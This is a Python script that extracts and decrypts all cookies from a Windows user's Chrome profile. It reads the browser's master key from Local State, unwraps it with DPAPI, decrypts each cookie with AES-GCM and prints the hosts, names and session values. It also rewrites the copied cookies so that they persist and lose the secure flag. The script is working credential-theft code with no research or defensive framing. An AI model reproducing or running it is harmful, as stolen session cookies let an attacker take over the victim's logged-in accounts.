import os
import json
import base64
import shutil
import sqlite3
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

# cookies extract

# datetime function
def chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, date: {chromedate}")
            return chromedate
    else:
        return ""
    
# encrypt function    
def encrypt_key():
    state_path = os.path.join(os.environ["USERPROFILE"], 
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        
    key = base64 .b64decode(local_state["os_crypt"] ["encrypted_key"])
    key = key[5:]
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# decrypt function
def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""
        
def main():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
        
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
        
    key = encrypt_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        print(f"""
        Hello Oniisan ^u^
        Host: {host_key}
        Cookie name: {name}
        Cookie value: {decrypted_value}
        Creation datetime: {chrome_datetime(creation_utc)}
        Last access datetime: {chrome_datetime(last_access_utc)}
        Expires datetime: {chrome_datetime(expires_utc)}
        ===============================================================
        """)
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()

# main    
if __name__ == "__main__":
    main()
